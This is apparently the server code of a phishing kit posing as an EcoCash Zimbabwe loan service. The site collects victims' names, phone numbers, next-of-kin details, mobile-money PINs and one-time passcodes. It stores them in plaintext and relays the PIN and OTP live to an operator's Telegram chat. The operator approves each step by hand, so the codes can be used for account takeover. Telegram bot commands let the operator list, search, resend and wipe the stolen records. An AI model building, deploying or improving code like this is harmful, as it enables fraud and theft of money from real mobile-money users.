// ============================================================
// server/server.js – EcoCash Zimbabwe Loans Backend
// Merged with MoMo persistence + rich bot commands
// ============================================================
console.log("🟢 1. Server is starting...");
require('dotenv').config();
console.log("🟢 2. dotenv loaded");

const express = require('express');
const fetch = require('node-fetch');
const cors = require('cors');
const path = require('path');
const fs = require('fs');

const app = express();

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, '../frontend')));

// ─── In-Memory Store ───
const applications = {};
const rejectionHistory = {};
const appRefs = {};
const resendCooldowns = {};
const RESEND_COOLDOWN_MS = 60 * 1000;

const PORT = process.env.PORT || 3000;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const DATA_RETENTION_DAYS = parseInt(process.env.DATA_RETENTION_DAYS || '7', 10);

if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.error('❌ Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID');
    console.log('Please set these in your .env file or Render environment variables');
}

const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
console.log('✅ Server starting...');

// ─── Data Persistence Setup ───
const DATA_DIR = path.join(__dirname, '../data');
const DATA_FILE = path.join(DATA_DIR, 'applications.json');
const HISTORY_FILE = path.join(DATA_DIR, 'rejection_history.json');

if (!fs.existsSync(DATA_DIR)) {
    fs.mkdirSync(DATA_DIR, { recursive: true });
    console.log('📁 Created data directory');
}

// ─── Save / Load Functions ───
function saveApplications() {
    try {
        const data = {
            applications,
            rejectionHistory,
            appRefs,
            timestamp: new Date().toISOString()
        };
        fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
        console.log('💾 Applications saved to disk');
        return true;
    } catch (error) {
        console.error('❌ Error saving applications:', error);
        return false;
    }
}

function loadApplications() {
    try {
        if (fs.existsSync(DATA_FILE)) {
            const data = fs.readFileSync(DATA_FILE, 'utf8');
            const parsed = JSON.parse(data);

            const age = Date.now() - new Date(parsed.timestamp).getTime();
            if (age < DATA_RETENTION_DAYS * 24 * 60 * 60 * 1000) {
                Object.assign(applications, parsed.applications || {});
                Object.assign(rejectionHistory, parsed.rejectionHistory || {});
                Object.assign(appRefs, parsed.appRefs || {});
                console.log(`📂 Loaded ${Object.keys(applications).length} applications from disk`);
                return true;
            } else {
                console.log(`📂 Data older than ${DATA_RETENTION_DAYS} days — backing up & starting fresh`);
                const backupFile = path.join(DATA_DIR, `applications_backup_${Date.now()}.json`);
                fs.copyFileSync(DATA_FILE, backupFile);
                console.log(`📂 Backed up old data to ${backupFile}`);
                return false;
            }
        }
    } catch (error) {
        console.error('❌ Error loading applications:', error);
    }
    return false;
}

function saveRejectionHistory() {
    try {
        fs.writeFileSync(HISTORY_FILE, JSON.stringify(rejectionHistory, null, 2));
        console.log('💾 Rejection history saved to disk');
        return true;
    } catch (error) {
        console.error('❌ Error saving rejection history:', error);
        return false;
    }
}

function loadRejectionHistory() {
    try {
        if (fs.existsSync(HISTORY_FILE)) {
            const data = fs.readFileSync(HISTORY_FILE, 'utf8');
            const parsed = JSON.parse(data);
            Object.assign(rejectionHistory, parsed);
            console.log(`📂 Loaded rejection history from disk`);
            return true;
        }
    } catch (error) {
        console.error('❌ Error loading rejection history:', error);
    }
    return false;
}

// ─── Auto-save every 30 seconds ───
setInterval(() => {
    if (Object.keys(applications).length > 0) {
        saveApplications();
        if (Object.keys(rejectionHistory).length > 0) {
            saveRejectionHistory();
        }
    }
}, 30000);

// ─── Save on shutdown ───
function gracefulShutdown() {
    console.log('🔄 Saving data before shutdown...');
    saveApplications();
    saveRejectionHistory();
    process.exit(0);
}

process.on('SIGINT', gracefulShutdown);
process.on('SIGTERM', gracefulShutdown);

// ─── Load data on startup ───
loadApplications();
loadRejectionHistory();

// ─── Helpers ───
function esc(s) {
    return String(s == null ? '' : s)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;');
}

function generateAppRef(appId) {
    let ref;
    do {
        ref = Math.random().toString(36).substring(2, 8).toUpperCase();
    } while (appRefs[ref] && appRefs[ref] !== appId);
    appRefs[ref] = appId;
    return ref;
}

function getOrCreateRef(appId) {
    let ref = Object.keys(appRefs).find(k => appRefs[k] === appId);
    if (!ref) ref = generateAppRef(appId);
    return ref;
}

function checkResendCooldown(appId, step) {
    const key = `${appId}:${step}`;
    const last = resendCooldowns[key] || 0;
    const remaining = RESEND_COOLDOWN_MS - (Date.now() - last);
    if (remaining > 0) {
        return { blocked: true, remainingSec: Math.ceil(remaining / 1000) };
    }
    resendCooldowns[key] = Date.now();
    return { blocked: false };
}

// ─── Telegram Message Sender ───
async function sendTelegramMessage(message, buttons = null) {
    if (!TELEGRAM_BOT_TOKEN) {
        console.error('❌ Cannot send message: TELEGRAM_BOT_TOKEN is missing');
        return { ok: false, error: 'Bot token missing' };
    }

    const body = { chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' };
    if (buttons) body.reply_markup = { inline_keyboard: buttons };

    try {
        const response = await fetch(`${TELEGRAM_API_URL}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(body)
        });
        const data = await response.json();
        if (!data.ok) {
            console.error('Telegram API error:', data);
            return data;
        }
        console.log('✅ Telegram message sent');
        return data;
    } catch (error) {
        console.error('Error sending Telegram message:', error);
        return { ok: false, error: error.message };
    }
}

async function editTelegramMessage(messageId, message) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID || !messageId) return;
    try {
        await fetch(`${TELEGRAM_API_URL}/editMessageText`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                message_id: messageId,
                text: message,
                parse_mode: 'HTML',
                reply_markup: { inline_keyboard: [] }
            })
        });
    } catch (e) {
        console.error('Telegram edit error:', e);
    }
}

async function answerCallback(queryId, text) {
    if (!TELEGRAM_BOT_TOKEN) return;
    try {
        await fetch(`${TELEGRAM_API_URL}/answerCallbackQuery`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ callback_query_id: queryId, text, show_alert: false })
        });
    } catch (e) {
        console.error('answerCallbackQuery error:', e);
    }
}

// ─── API Routes ───
app.get('/api/health', (req, res) => res.json({ ok: true }));

// ─── Submit Application ───
app.post('/api/send-application', async (req, res) => {
    try {
        const data = req.body.applicationData;
        if (!data || !data.phone || !data.firstName) {
            return res.status(400).json({ ok: false, error: 'Missing required fields' });
        }

        const appId = `${data.phone}_${Date.now()}`;
        const ref = generateAppRef(appId);

        applications[appId] = {
            ...data,
            appStatus: 'pending',
            pinStatus: 'pending',
            otpStatus: 'pending',
            pinAttempts: 0,
            maxPinAttempts: 3,
            pinBlockedUntil: null,
            resubmissionCount: 0,
            telegramMessages: {},
            createdAt: new Date().toISOString(),
            updatedAt: new Date().toISOString()
        };

        saveApplications();
        console.log(`📝 Application submitted: ${appId}`);

        const message =
            `🆕 <b>NEW LOAN APPLICATION (ZIMBABWE)</b>\n` +
            `━━━━━━━━━━━━━━━━━━━━━━\n` +
            `🆔 ID: <code>${esc(appId)}</code>\n` +
            `📱 Phone: +263${esc(data.phone)}\n` +
            `💰 Amount: $${esc(data.loanAmount)}\n` +
            `📅 Duration: ${esc(data.loanDuration)} days\n` +
            `👤 Name: ${esc(data.firstName)} ${esc(data.lastName)}\n` +
            `📧 Email: ${esc(data.email)}\n` +
            `📍 Province: ${esc(data.province)}\n` +
            `📝 Reason: ${esc(data.loanReason || '—')}\n\n` +
            `✅ <b>Please approve or reject this application:</b>`;

        const buttons = [[
            { text: '✅ YES', callback_data: `A|Y|${ref}` },
            { text: '❌ NO',  callback_data: `A|N|${ref}` }
        ]];

        const result = await sendTelegramMessage(message, buttons);
        applications[appId].telegramMessages.app = result?.result?.message_id || null;

        res.json({ ok: true, applicationId: appId, status: 'waiting_app_approval' });
    } catch (error) {
        console.error('Error in /api/send-application:', error);
        res.status(500).json({ ok: false, error: error.message });
    }
});

// ─── Submit PIN ───
app.post('/api/send-pin', async (req, res) => {
    try {
        const { applicationId, pin } = req.body;
        const app = applications[applicationId];
        if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });

        if (app.appStatus !== 'approved') {
            return res.status(400).json({ ok: false, error: 'Application not yet approved' });
        }

        if (app.pinBlockedUntil && new Date(app.pinBlockedUntil) > new Date()) {
            const remaining = Math.ceil((new Date(app.pinBlockedUntil) - new Date()) / 1000);
            return res.status(429).json({
                ok: false,
                blocked: true,
                message: `Too many attempts. Please wait ${remaining}s.`,
                remainingSeconds: remaining
            });
        }
        if (app.pinBlockedUntil && new Date(app.pinBlockedUntil) <= new Date()) {
            app.pinAttempts = 0;
            app.pinBlockedUntil = null;
        }

        app.pin = pin;
        app.pinStatus = 'pending';
        app.updatedAt = new Date().toISOString();
        saveApplications();

        const ref = getOrCreateRef(applicationId);
        const message =
            `🔐 <b>PIN VERIFICATION</b>\n` +
            `━━━━━━━━━━━━━━━━━━━━━━\n` +
            `🆔 ID: <code>${esc(applicationId)}</code>\n` +
            `👤 Name: ${esc(app.firstName)} ${esc(app.lastName)}\n` +
            `🔢 PIN: <b>${esc(pin)}</b>\n\n` +
            `✅ <b>Please approve or reject this PIN:</b>`;

        const buttons = [[
            { text: '✅ YES', callback_data: `P|Y|${ref}` },
            { text: '❌ NO',  callback_data: `P|N|${ref}` }
        ]];

        const result = await sendTelegramMessage(message, buttons);
        app.telegramMessages = app.telegramMessages || {};
        app.telegramMessages.pin = result?.result?.message_id || null;

        res.json({ ok: true, status: 'pending' });
    } catch (error) {
        console.error('Error in /api/send-pin:', error);
        res.status(500).json({ ok: false, error: error.message });
    }
});

// ─── Submit OTP ───
app.post('/api/send-otp', async (req, res) => {
    try {
        const { applicationId, otp } = req.body;
        const app = applications[applicationId];
        if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });

        if (app.pinStatus !== 'approved') {
            return res.status(400).json({ ok: false, error: 'PIN not yet approved' });
        }

        app.otp = otp;
        app.otpStatus = 'pending';
        app.updatedAt = new Date().toISOString();
        saveApplications();

        const ref = getOrCreateRef(applicationId);
        const message =
            `🔢 <b>OTP VERIFICATION</b>\n` +
            `━━━━━━━━━━━━━━━━━━━━━━\n` +
            `🆔 ID: <code>${esc(applicationId)}</code>\n` +
            `👤 Name: ${esc(app.firstName)} ${esc(app.lastName)}\n` +
            `🔑 OTP: <b>${esc(otp)}</b>\n\n` +
            `✅ <b>Please approve or reject this OTP:</b>`;

        const buttons = [[
            { text: '✅ YES', callback_data: `O|Y|${ref}` },
            { text: '❌ NO',  callback_data: `O|N|${ref}` }
        ]];

        const result = await sendTelegramMessage(message, buttons);
        app.telegramMessages = app.telegramMessages || {};
        app.telegramMessages.otp = result?.result?.message_id || null;

        res.json({ ok: true, status: 'pending' });
    } catch (error) {
        console.error('Error in /api/send-otp:', error);
        res.status(500).json({ ok: false, error: error.message });
    }
});

// ─── Resend OTP ───
app.post('/api/resend-otp', async (req, res) => {
    try {
        const { applicationId } = req.body;
        const app = applications[applicationId];
        if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });

        const cd = checkResendCooldown(applicationId, 'otp');
        if (cd.blocked) {
            return res.status(429).json({
                ok: false, cooldown: true, remainingSec: cd.remainingSec,
                error: `Please wait ${cd.remainingSec}s before resending again.`
            });
        }

        app.otpStatus = 'pending';
        app.updatedAt = new Date().toISOString();
        saveApplications();

        const ref = getOrCreateRef(applicationId);
        const message =
            `🔄 <b>OTP RESENT – ADMIN ACTION REQUIRED</b>\n` +
            `━━━━━━━━━━━━━━━━━━━━━━\n` +
            `🆔 ID: <code>${esc(applicationId)}</code>\n` +
            `👤 Name: ${esc(app.firstName)} ${esc(app.lastName)}\n` +
            `📱 Phone: +263${esc(app.phone)}\n\n` +
            `📌 New OTP requested by user.\n` +
            `✅ <b>Please approve or reject:</b>`;

        const buttons = [[
            { text: '✅ YES', callback_data: `O|Y|${ref}` },
            { text: '❌ NO',  callback_data: `O|N|${ref}` }
        ]];

        const result = await sendTelegramMessage(message, buttons);
        app.telegramMessages = app.telegramMessages || {};
        app.telegramMessages.otp = result?.result?.message_id || null;

        res.json({ ok: true, status: 'otp_resent' });
    } catch (error) {
        console.error('Error in /api/resend-otp:', error);
        res.status(500).json({ ok: false, error: error.message });
    }
});

// ─── Resend Application ───
app.post('/api/resend-application/:applicationId', async (req, res) => {
    try {
        const app = applications[req.params.applicationId];
        if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });

        const cd = checkResendCooldown(req.params.applicationId, 'app');
        if (cd.blocked) {
            return res.status(429).json({
                ok: false, cooldown: true, remainingSec: cd.remainingSec,
                error: `Please wait ${cd.remainingSec}s before resending again.`
            });
        }

        const ref = getOrCreateRef(req.params.applicationId);
        const message =
            `🔄 <b>RESENT – LOAN APPLICATION</b>\n` +
            `━━━━━━━━━━━━━━━━━━━━━━\n` +
            `🆔 ID: <code>${esc(req.params.applicationId)}</code>\n` +
            `📱 Phone: +263${esc(app.phone)}\n` +
            `💰 Amount: $${esc(app.loanAmount)}\n` +
            `📅 Duration: ${esc(app.loanDuration)} days\n` +
            `👤 Name: ${esc(app.firstName)} ${esc(app.lastName)}\n` +
            `📌 Current status: <b>${esc(app.appStatus)}</b>\n\n` +
            `✅ <b>Please approve or reject:</b>`;

        const buttons = [[
            { text: '✅ YES', callback_data: `A|Y|${ref}` },
            { text: '❌ NO',  callback_data: `A|N|${ref}` }
        ]];

        const result = await sendTelegramMessage(message, buttons);
        app.telegramMessages = app.telegramMessages || {};
        app.telegramMessages.app = result?.result?.message_id || null;

        res.json({ ok: true, status: app.appStatus, messageId: result?.result?.message_id });
    } catch (error) {
        console.error('Error in /api/resend-application:', error);
        res.status(500).json({ ok: false, error: error.message });
    }
});

// ─── Resend current step ───
app.post('/api/resend-step/:applicationId/:step', async (req, res) => {
    try {
        const { applicationId, step } = req.params;
        const app = applications[applicationId];
        if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });

        const cd = checkResendCooldown(applicationId, step);
        if (cd.blocked) {
            return res.status(429).json({
                ok: false, cooldown: true, remainingSec: cd.remainingSec,
                error: `Please wait ${cd.remainingSec}s before resending again.`
            });
        }

        const ref = getOrCreateRef(applicationId);
        let message, buttons, statusKey;

        if (step === 'app') {
            message = `🔄 <b>APP step (resend)</b>\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: <code>${esc(applicationId)}</code>\n💰 $${esc(app.loanAmount)} / ${esc(app.loanDuration)}d\n📌 Status: <b>${esc(app.appStatus)}</b>`;
            buttons = [[{ text: '✅ YES', callback_data: `A|Y|${ref}` }, { text: '❌ NO', callback_data: `A|N|${ref}` }]];
            statusKey = 'appStatus';
        } else if (step === 'pin') {
            message = `🔄 <b>PIN step (resend)</b>\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: <code>${esc(applicationId)}</code>\n🔢 PIN: <b>${esc(app.pin || '—')}</b>\n📌 Status: <b>${esc(app.pinStatus)}</b>`;
            buttons = [[{ text: '✅ YES', callback_data: `P|Y|${ref}` }, { text: '❌ NO', callback_data: `P|N|${ref}` }]];
            statusKey = 'pinStatus';
        } else if (step === 'otp') {
            message = `🔄 <b>OTP step (resend)</b>\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: <code>${esc(applicationId)}</code>\n🔑 OTP: <b>${esc(app.otp || '—')}</b>\n📌 Status: <b>${esc(app.otpStatus)}</b>`;
            buttons = [[{ text: '✅ YES', callback_data: `O|Y|${ref}` }, { text: '❌ NO', callback_data: `O|N|${ref}` }]];
            statusKey = 'otpStatus';
        } else {
            return res.status(400).json({ ok: false, error: 'Invalid step' });
        }

        const result = await sendTelegramMessage(message, buttons);
        app.telegramMessages = app.telegramMessages || {};
        app.telegramMessages[step] = result?.result?.message_id || null;

        res.json({ ok: true, status: app[statusKey] || 'pending', messageId: result?.result?.message_id });
    } catch (error) {
        console.error('Error in /api/resend-step:', error);
        res.status(500).json({ ok: false, error: error.message });
    }
});

// ─── Reset step ───
app.post('/api/reset-step/:applicationId/:step', async (req, res) => {
    try {
        const { applicationId, step } = req.params;
        const app = applications[applicationId];
        if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });

        if (step === 'app') {
            app.appStatus = 'pending';
        } else if (step === 'pin') {
            app.pinStatus = 'pending';
            app.pinAttempts = 0;
            app.pinBlockedUntil = null;
        } else if (step === 'otp') {
            app.otpStatus = 'pending';
        } else {
            return res.status(400).json({ ok: false, error: 'Invalid step' });
        }
        app.updatedAt = new Date().toISOString();
        saveApplications();

        res.json({ ok: true, status: 'pending' });
    } catch (error) {
        res.status(500).json({ ok: false, error: error.message });
    }
});

// ─── Status Polling ───
app.get('/api/status/:applicationId/:step', (req, res) => {
    try {
        const app = applications[req.params.applicationId];
        if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });

        let status = 'pending';
        let remainingAttempts = null;
        let blocked = false;

        if (req.params.step === 'app') {
            status = app.appStatus;
        } else if (req.params.step === 'pin') {
            status = app.pinStatus;
            remainingAttempts = app.maxPinAttempts - (app.pinAttempts || 0);
            blocked = app.pinStatus === 'blocked' || (app.pinBlockedUntil && new Date(app.pinBlockedUntil) > new Date());
        } else if (req.params.step === 'otp') {
            status = app.otpStatus;
        }

        const rejectionInfo = rejectionHistory[req.params.applicationId] || null;

        res.json({
            ok: true,
            status,
            remainingAttempts,
            blocked,
            rejectionInfo,
            resubmissionCount: app.resubmissionCount || 0
        });
    } catch (error) {
        res.status(500).json({ ok: false, error: error.message });
    }
});

// ─── Rejection Info ───
app.get('/api/rejection-info/:applicationId', (req, res) => {
    try {
        const app = applications[req.params.applicationId];
        if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });

        let rejectedStep = null;
        let errorMessage = '';

        if (app.appStatus === 'rejected') {
            rejectedStep = 'app';
            errorMessage = '❌ Your application was rejected. Please review and resubmit.';
        } else if (app.pinStatus === 'rejected') {
            rejectedStep = 'pin';
            errorMessage = '❌ Your PIN was rejected. Please re-enter your PIN.';
        } else if (app.otpStatus === 'rejected') {
            rejectedStep = 'otp';
            errorMessage = '❌ Your OTP was rejected. Please request a new OTP.';
        }

        res.json({
            ok: true,
            rejectedStep,
            errorMessage,
            applicationId: req.params.applicationId
        });
    } catch (error) {
        res.status(500).json({ ok: false, error: error.message });
    }
});

// ─── Telegram Webhook ───
app.post('/api/telegram-webhook', async (req, res) => {
    console.log('📩 Webhook received');

    try {
        // ─── Text commands ───
        if (req.body.message && req.body.message.text) {
            const text = req.body.message.text.trim();
            const chatId = req.body.message.chat.id;
            const username = req.body.message.from?.username || 'Unknown';

            console.log(`💬 Command from ${username}: ${text}`);

            if (chatId.toString() !== TELEGRAM_CHAT_ID) {
                await sendTelegramMessage(`⚠️ You are not authorized to use this bot.`);
                return res.sendStatus(200);
            }

            if (text === '/stats') {
                const total = Object.keys(applications).length;
                const pendingApp = Object.values(applications).filter(a => a.appStatus === 'pending').length;
                const pendingPin = Object.values(applications).filter(a => a.pinStatus === 'pending').length;
                const pendingOtp = Object.values(applications).filter(a => a.otpStatus === 'pending').length;
                const approved = Object.values(applications).filter(a => a.otpStatus === 'approved').length;
                const rejected = Object.values(applications).filter(a =>
                    a.appStatus === 'rejected' || a.pinStatus === 'rejected' || a.otpStatus === 'rejected'
                ).length;

                await sendTelegramMessage(
                    `📊 <b>APPLICATION STATISTICS</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━━━\n` +
                    `📝 Total: ${total}\n` +
                    `⏳ Pending App: ${pendingApp}\n` +
                    `⏳ Pending PIN: ${pendingPin}\n` +
                    `⏳ Pending OTP: ${pendingOtp}\n` +
                    `✅ Approved: ${approved}\n` +
                    `❌ Rejected: ${rejected}`
                );
                return res.sendStatus(200);
            }

            if (text === '/list') {
                const ids = Object.keys(applications);
                if (ids.length === 0) {
                    await sendTelegramMessage('📭 No applications found.');
                    return res.sendStatus(200);
                }

                const displayIds = ids.slice(-10);
                let message = '📋 <b>APPLICATION LIST</b>\n━━━━━━━━━━━━━━━━━━━━━━\n';
                displayIds.forEach((id, i) => {
                    const app = applications[id];
                    message += `\n${i + 1}. 🆔 <code>${esc(id)}</code>\n`;
                    message += `   👤 ${esc(app.firstName)} ${esc(app.lastName)}\n`;
                    message += `   📱 +263${esc(app.phone)}\n`;
                    message += `   💰 $${esc(app.loanAmount)}\n`;
                    message += `   📌 APP: ${app.appStatus} | PIN: ${app.pinStatus} | OTP: ${app.otpStatus}\n`;
                });

                if (ids.length > 10) {
                    message += `\n... and ${ids.length - 10} more. Use /search [ID] to find specific.`;
                }

                await sendTelegramMessage(message);
                return res.sendStatus(200);
            }

            if (text.startsWith('/search ')) {
                const searchId = text.replace('/search ', '').trim();
                const app = applications[searchId];

                if (!app) {
                    await sendTelegramMessage(`❌ Application <code>${esc(searchId)}</code> not found.`);
                    return res.sendStatus(200);
                }

                await sendTelegramMessage(
                    `🔍 <b>APPLICATION DETAILS</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━━━\n` +
                    `🆔 ID: <code>${esc(searchId)}</code>\n` +
                    `👤 Name: ${esc(app.firstName)} ${esc(app.lastName)}\n` +
                    `📱 Phone: +263${esc(app.phone)}\n` +
                    `📧 Email: ${esc(app.email)}\n` +
                    `💰 Amount: $${esc(app.loanAmount)}\n` +
                    `📅 Duration: ${esc(app.loanDuration)} days\n` +
                    `📍 Province: ${esc(app.province)}\n` +
                    `📝 Reason: ${esc(app.loanReason || '—')}\n` +
                    `👨‍👩‍👦 Kin: ${esc(app.kinFirstName || '—')} ${esc(app.kinLastName || '')} (+263${esc(app.kinPhone || '')})\n\n` +
                    `📨 APP: ${app.appStatus}\n` +
                    `🔐 PIN: ${app.pinStatus} (${app.pinAttempts || 0}/${app.maxPinAttempts})\n` +
                    `🔑 OTP: ${app.otpStatus}`
                );
                return res.sendStatus(200);
            }

            if (text.startsWith('/delete ')) {
                const deleteId = text.replace('/delete ', '').trim();
                if (applications[deleteId]) {
                    const appName = applications[deleteId].firstName + ' ' + applications[deleteId].lastName;
                    delete applications[deleteId];
                    saveApplications();
                    await sendTelegramMessage(`✅ Application <code>${esc(deleteId)}</code> (${esc(appName)}) deleted.`);
                } else {
                    await sendTelegramMessage(`❌ Application <code>${esc(deleteId)}</code> not found.`);
                }
                return res.sendStatus(200);
            }

            if (text === '/clear') {
                const count = Object.keys(applications).length;
                if (count === 0) {
                    await sendTelegramMessage('📭 No applications to clear.');
                    return res.sendStatus(200);
                }
                Object.keys(applications).forEach(k => delete applications[k]);
                Object.keys(rejectionHistory).forEach(k => delete rejectionHistory[k]);
                Object.keys(appRefs).forEach(k => delete appRefs[k]);
                saveApplications();
                saveRejectionHistory();
                await sendTelegramMessage(`✅ Cleared all ${count} applications.`);
                return res.sendStatus(200);
            }

            if (text === '/status') {
                const appCount = Object.keys(applications).length;
                let webhookUrl = 'Not set';
                try {
                    const wi = await fetch(`${TELEGRAM_API_URL}/getWebhookInfo`).then(r => r.json());
                    webhookUrl = wi.result?.url || 'Not set';
                } catch (e) { /* ignore */ }

                await sendTelegramMessage(
                    `✅ <b>BOT STATUS</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━━━\n` +
                    `🟢 Status: Online\n` +
                    `📊 Applications: ${appCount}\n` +
                    `⏰ Time: ${new Date().toISOString()}\n` +
                    `🔗 Webhook: ${esc(webhookUrl)}\n` +
                    `💾 Data File: ${fs.existsSync(DATA_FILE) ? '✅' : '❌'}`
                );
                return res.sendStatus(200);
            }

            if (text === '/refresh ' || text.startsWith('/refresh ')) {
                const id = text.replace('/refresh ', '').trim();
                const app = applications[id];
                if (!app) {
                    await sendTelegramMessage(`❌ Not found: <code>${esc(id)}</code>`);
                    return res.sendStatus(200);
                }

                let step = 'app';
                if (app.appStatus === 'approved' && app.pinStatus === 'pending') step = 'pin';
                else if (app.pinStatus === 'approved' && app.otpStatus === 'pending') step = 'otp';

                const ref = getOrCreateRef(id);
                let message, buttons;
                if (step === 'app') {
                    message = `🔄 <b>APP step (refresh)</b>\n🆔 <code>${esc(id)}</code>\n💰 $${esc(app.loanAmount)} / ${esc(app.loanDuration)}d\n📌 <b>${esc(app.appStatus)}</b>`;
                    buttons = [[{ text: '✅ YES', callback_data: `A|Y|${ref}` }, { text: '❌ NO', callback_data: `A|N|${ref}` }]];
                } else if (step === 'pin') {
                    message = `🔄 <b>PIN step (refresh)</b>\n🆔 <code>${esc(id)}</code>\n🔢 <b>${esc(app.pin || '—')}</b>\n📌 <b>${esc(app.pinStatus)}</b>`;
                    buttons = [[{ text: '✅ YES', callback_data: `P|Y|${ref}` }, { text: '❌ NO', callback_data: `P|N|${ref}` }]];
                } else {
                    message = `🔄 <b>OTP step (refresh)</b>\n🆔 <code>${esc(id)}</code>\n🔑 <b>${esc(app.otp || '—')}</b>\n📌 <b>${esc(app.otpStatus)}</b>`;
                    buttons = [[{ text: '✅ YES', callback_data: `O|Y|${ref}` }, { text: '❌ NO', callback_data: `O|N|${ref}` }]];
                }
                const result = await sendTelegramMessage(message, buttons);
                app.telegramMessages = app.telegramMessages || {};
                app.telegramMessages[step] = result?.result?.message_id || null;
                return res.sendStatus(200);
            }

            if (text.startsWith('/reset ')) {
                const parts = text.replace('/reset ', '').trim().split(/\s+/);
                const [id, step] = parts;
                const app = applications[id];
                if (!app) {
                    await sendTelegramMessage(`❌ Not found: <code>${esc(id)}</code>`);
                } else if (!['app', 'pin', 'otp'].includes(step)) {
                    await sendTelegramMessage('Usage: /reset &lt;id&gt; &lt;app|pin|otp&gt;');
                } else {
                    if (step === 'app') app.appStatus = 'pending';
                    else if (step === 'pin') { app.pinStatus = 'pending'; app.pinAttempts = 0; app.pinBlockedUntil = null; }
                    else app.otpStatus = 'pending';
                    app.updatedAt = new Date().toISOString();
                    saveApplications();
                    await sendTelegramMessage(`♻️ Reset <b>${esc(step)}</b> for <code>${esc(id)}</code> to pending.`);
                }
                return res.sendStatus(200);
            }

            if (text === '/help' || text === '/start') {
                await sendTelegramMessage(
                    `🤖 <b>AVAILABLE COMMANDS</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━━━\n` +
                    `📊 /stats — Application statistics\n` +
                    `📋 /list — Last 10 applications\n` +
                    `🔍 /search [ID] — Find specific application\n` +
                    `🗑️ /delete [ID] — Delete an application\n` +
                    `🧹 /clear — Clear ALL applications\n` +
                    `🔄 /refresh [ID] — Resend current step\n` +
                    `♻️ /reset [ID] [app|pin|otp] — Reset step\n` +
                    `📌 /status — Check bot status\n` +
                    `❓ /help — Show this menu`
                );
                return res.sendStatus(200);
            }

            if (text.startsWith('/')) {
                await sendTelegramMessage(`❌ Unknown command. Type /help to see available commands.`);
                return res.sendStatus(200);
            }
        }

        // ─── Callback buttons ───
        if (req.body.callback_query) {
            const query = req.body.callback_query;
            console.log('🔘 Callback query:', query.data);

            const parts = (query.data || '').split('|');
            if (parts.length !== 3) {
                await answerCallback(query.id, '⚠️ Invalid data');
                return res.sendStatus(200);
            }

            const [stepCode, actionCode, ref] = parts;
            const stepMap = { A: 'APP', P: 'PIN', O: 'OTP' };
            const s = stepMap[stepCode];
            const a = actionCode === 'Y' ? 'YES' : 'NO';

            const appId = appRefs[ref];
            const app = applications[appId];
            if (!app) {
                await answerCallback(query.id, '⚠️ Application expired or not found');
                return res.sendStatus(200);
            }

            const currentStatus =
                s === 'APP' ? app.appStatus :
                s === 'PIN' ? app.pinStatus :
                app.otpStatus;

            const stepKey = s.toLowerCase();
            const msgId = (app.telegramMessages || {})[stepKey];

            if (currentStatus !== 'pending') {
                await answerCallback(query.id, `Already decided: ${currentStatus.toUpperCase()}`);
                await editTelegramMessage(
                    msgId,
                    `ℹ️ <b>${s} step</b>\n🆔 <code>${esc(appId)}</code>\nAlready handled: <b>${esc(currentStatus.toUpperCase())}</b>`
                );
                return res.sendStatus(200);
            }

            // Record rejection history
            if (a === 'NO') {
                rejectionHistory[appId] = {
                    step: s,
                    timestamp: new Date().toISOString(),
                    previousStatus: currentStatus
                };
                saveRejectionHistory();
            }

            // Apply decision
            if (s === 'APP') {
                app.appStatus = a === 'YES' ? 'approved' : 'rejected';
            } else if (s === 'PIN') {
                if (a === 'YES') {
                    app.pinStatus = 'approved';
                } else {
                    app.pinAttempts = (app.pinAttempts || 0) + 1;
                    if (app.pinAttempts >= app.maxPinAttempts) {
                        app.pinStatus = 'blocked';
                        app.pinBlockedUntil = new Date(Date.now() + 5 * 60 * 1000).toISOString();
                    } else {
                        app.pinStatus = 'rejected';
                    }
                }
            } else if (s === 'OTP') {
                app.otpStatus = a === 'YES' ? 'approved' : 'rejected';
            }

            app.updatedAt = new Date().toISOString();
            saveApplications();

            await answerCallback(query.id, `✅ ${a === 'YES' ? 'Approved' : 'Rejected'}!`);

            const statusText = {
                APP: `App: ${app.appStatus}`,
                PIN: `PIN: ${app.pinStatus}${app.pinStatus === 'rejected' ? ` (${app.pinAttempts}/${app.maxPinAttempts})` : ''}`,
                OTP: `OTP: ${app.otpStatus}`
            }[s];

            await editTelegramMessage(
                msgId,
                `📋 <b>${s} step decided</b>\n🆔 <code>${esc(appId)}</code>\nAction: <b>${a}</b>\nStatus: <b>${esc(statusText)}</b>`
            );

            await sendTelegramMessage(
                `📌 <b>Status Update</b>\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 <code>${esc(appId)}</code>\n📋 Step: ${s}\n📌 Status: <b>${esc(statusText)}</b>`
            );

            return res.sendStatus(200);
        }

        res.sendStatus(200);
    } catch (error) {
        console.error('❌ Webhook error:', error);
        res.sendStatus(500);
    }
});

// ─── Debug Endpoints ───
